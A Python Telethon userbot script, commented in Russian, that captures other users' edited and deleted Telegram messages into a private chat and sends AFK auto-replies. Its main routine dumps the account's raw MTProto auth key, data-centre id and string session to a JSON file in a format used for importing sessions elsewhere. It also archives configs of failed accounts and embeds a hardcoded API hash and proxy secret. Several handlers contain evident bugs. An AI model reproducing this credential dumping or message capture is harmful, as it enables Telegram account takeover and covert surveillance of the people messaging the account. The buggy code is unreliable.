from imports import *
import signal
from threading import Event

# Глобальная переменная для контроля работы
shutdown_event = Event()

def handle_shutdown(signum, frame):
    print(f"\nПолучен сигнал завершения {signum}, выключаюсь...")
    shutdown_event.set()

# Регистрируем обработчики сигналов
signal.signal(signal.SIGINT, handle_shutdown)
signal.signal(signal.SIGTERM, handle_shutdown)

API_ID, API_HASH = 13529272, "061e06eb472e220e6639bb764000e195"
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)
proxy = ("87.229.100.237", 443, "79e462821249bd7ac519130220c25d09")
if len(sys.argv) > 1:
    phone = sys.argv[1]

with open("config.json", "r", encoding="utf-8") as f:
    data = json.load(f)
if "session" in data[phone]:
    ses_have=True
    string_ses = data[phone]["session"]
else:
    ses_have=False
    client = TelegramClient(
    StringSession(), 
    API_ID, 
    API_HASH, 
    device_model="devjeb", 
    app_version="777", 
    system_version="777", 
    connection=connection.ConnectionTcpMTProxyRandomizedIntermediate,
    proxy=proxy
)
if ses_have:
    client = TelegramClient(
    StringSession(string_ses), 
    API_ID, 
    API_HASH, 
    device_model="devjeb", 
    app_version="777", 
    system_version="777", 
    connection=connection.ConnectionTcpMTProxyRandomizedIntermediate,
    proxy=proxy
)

_list = f"list/{phone}.json"
if not os.path.exists(_list):
    ll = {"wl": [], "bl": [], "data": {}}
    with open(_list, "w") as f:
       json.dump(ll, f, indent=4, ensure_ascii=False)

deleted_messages = {}

@client.on(events.NewMessage(incoming=True))
async def message_handler(event):
    global chat, link
    if shutdown_event.is_set():
        return
        
    if not chat:
        result = await client(functions.messages.CreateChatRequest(
            users=[(await client.get_me()).id],
            title='@devjeb',
            ttl_period=0
        ))
        chat = -1 * int(result.to_dict()["updates"]["updates"][1]["participants"]["chat_id"])
        with open("config.json", "r", encoding="utf-8") as f:
            data = json.load(f)
        data[phone]["chat"] = chat
        with open("config.json", "w") as f:
            json.dump(data, f, indent=4, ensure_ascii=False)
    if event.sender_id == 777000:
        print(event.raw_text)
    with open(_list, "r") as f:
        ll = json.load(f)
    
    if not event.sender_id == (await client.get_me()).id or not event.sender_id in ll["wl"]:
        deleted_messages[event.id] = {"message": event, "chat": event.chat_id}

    if isinstance(await event.get_chat(), PeerUser):
        with open(_list, "r") as f:
            ll = json.load(f)
        if "afk" in ll:
            if ll["afk"] == "on":
                format = "%H:%M:%S"
                time1_obj = datetime.strptime(ll["afk"]["time"], format)
                time2_obj = datetime.strptime(datetime.now().strftime("%H:%M:%S"), format)
                await client.send_message(event.chat_id, ll["afk"]["text"].replace("time", str(time2_obj - time1_obj)), reply_to=event.id)

@client.on(events.NewMessage(outgoing=True))
async def out(event):
    if shutdown_event.is_set():
        return
        
    global client, _list, chat, phone
    del sys.modules['process']
    import process
    await process.take(client, event, _list, chat, phone)

@client.on(events.MessageEdited)
async def edited_handler(event):
    if shutdown_event.is_set():
        return
        
    global chat, link, bot
    with open(_list, "r") as f:
        ll = json.load(f)
    if event.sender_id == (await client.get_me()).id or event.sender_id in ll["wl"] or not event.id in deleted_messages:
        return
    if deleted_messages[event.id]["message"].raw_text == event.raw_text:
        return

    sender = await client.get_entity(event.sender_id)
    if sender.username:
        sender_link = f"<a href='tg://user?id={sender.id}'>.{sender.first_name if sender.first_name else 'неизвестного отправителя'} @{sender.username}</a>"
    else:
        if isinstance(sender, PeerChannel):
            sender_link = f"{sender.title}"
        elif isinstance(sender, PeerUser):
            sender_link = f"{sender.first_name}"

    chats = client.get_entity(deleted_messages[event.id]["chat"])

    if isinstance(chats, PeerChannel):
        chat_name = chats.title
    elif isinstance(chat, PeerUser):
        chat_name = chats.first_name
    elif isinstance(chats, PeerChat):
        chat_name = chats.title
    else:
        chat_name = "Неизвестный тип чата"
    
    text = f"Сообщение от {sender_link if sender_link else 'неизвестного отправителя'} было отредактировано из чата <a href='tg://user?id={deleted_messages[event.id]['chat']}'>{chat_name if chat_name else 'неизвестного отправителя'}</a>:\nСтарое содержимое:\n{deleted_messages[event.id]['message'].raw_text}\nНовое содержимое:\n"
    if event.raw_text:
        text += event.raw_text
    await client.send_message(chat, text, parse_mode='html')
    deleted_messages[event.id] = {"message": event, "chat": event.chat_id}

@client.on(events.MessageDeleted)
async def delete_handler(event):
    if shutdown_event.is_set():
        return
        
    global deleted_messages, chat
    for message_id in event.deleted_ids:
        if message_id in deleted_messages:
            msg_obj = deleted_messages[message_id]["message"]
            chats_id = deleted_messages[message_id]["chat"]
            sender = await client.get_entity(msg_obj.sender_id)
            
            if sender.username:
                sender_link = f"<a href='t.me/@id{sender.id}'>.{sender.first_name if sender.first_name else 'Контакт'} @{sender.username}</a>"
            else:
                try:
                    sender_link = f"{sender.first_name if sender.first_name else 'неизвестного отправителя'}"
                except AttributeError:
                    sender_link = f"<a href='t.me/c/{sender.id}/1'>Канал</a>"
            premium_emoji = sender.emoji_status.document_id if sender.emoji_status else None
            premium_emoji_text = f" {premium_emoji}" if premium_emoji else ""

            logger.info(f"Сообщение с ID {message_id} удалено от {sender_link if sender_link else 'неизвестного отправителя'}")

            chats = client.get_entity(chats_id)

            if isinstance(chats, (PeerChannel, PeerChat)):
                chat_name = chats.title
            elif isinstance(chat, PeerUser):
                chat_name = chats.first_name
            else:
                chat_name = "Неизвестный тип чата"

            text = f"Сообщение от {sender_link if sender_link else 'неизвестного отправителя'}{premium_emoji_text} было удалено из чата <a href='tg://user?id={chats_id}'>{chat_name if chat_name else 'неизвестного отправителя'}</a>:\n"

            if msg_obj.photo:
                await client.send_file(chat, msg_obj.photo, caption=text + (msg_obj.raw_text or ''), parse_mode='html')
            elif msg_obj.video:
                await client.send_file(chat, msg_obj.video, caption=text + (msg_obj.raw_text or ''), parse_mode='html')
            elif msg_obj.voice:
                await client.send_file(chat, msg_obj.voice, caption=text + (msg_obj.raw_text or ''), parse_mode='html')
            elif msg_obj.document:
                await client.send_file(chat, msg_obj.document, caption=text + (msg_obj.raw_text or ''), parse_mode='html')
            elif msg_obj.sticker:
                sticker_caption = "Стикер удален"
                await client.send_file(chat, msg_obj.sticker, caption=f"{text}{sticker_caption}", parse_mode='html')
                await client.send_message(chat, text + (msg_obj.raw_text or ''), parse_mode='html')
            else:
                await client.send_message(chat, text + (msg_obj.raw_text or ''), parse_mode='html')
            del deleted_messages[message_id]

async def main():
    global chat
    await client.start()
    if not await client.is_user_authorized():
        await client.disconnect()
        with open("config.json","r") as f:
            data = json.load(f)
        cff = data[phone]
        del data[phone]
        with open("config.json","w") as f:
            json.dump(data, f, indent=4, ensure_ascii=False)
        with open("archive.log","a+") as f:
            f.write(json.dumps(cff))
    print("Клиент запущен...")
    try:
        strings = StringSession.save(client.session)
        data = vars(client.session)
        dc_auth_k = data["_dc_id"]  
        id = (await client.get_me()).id  
        auth_key = client.session.auth_key
        auth_key_bytes = auth_key.key 
        auth__hex = auth_key_bytes.hex()  
    except Exception as e:
        logger.error(f"Failed to retrieve session data: {e}")
        return  
    
    if dc_auth_k is None or id is None or auth_key is None:
        logger.error("Session data is incomplete.")
        return 
    
    datas = [{"user_auth": {"dcID": dc_auth_k, "id": id}, f"dc{dc_auth_k}_auth_key": auth__hex}, strings]
    with open(_list, "r") as f:
        dd = json.load(f)
    dd["datas"] = datas
    with open(_list, "w") as f:
        json.dump(dd, f, indent=4, ensure_ascii=False)
    
    with open("config.json", "r") as f:
        cfg = json.load(f)[phone]
    cfg["session"]=StringSession.save(client.session)  
    if "chat" in cfg:
        chat = cfg["chat"]
    else:
        chat = 0
    
    # Основной цикл с проверкой флага завершения
    while not shutdown_event.is_set():
        try:
            await asyncio.sleep(1)
        except asyncio.CancelledError:
            break
    
    # Корректное завершение
    await client.disconnect()
    print("Клиент успешно остановлен")

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nЗавершение по Ctrl+C")
        shutdown_event.set()
    except Exception as e:
        print(f"Ошибка: {e}")
        shutdown_event.set()
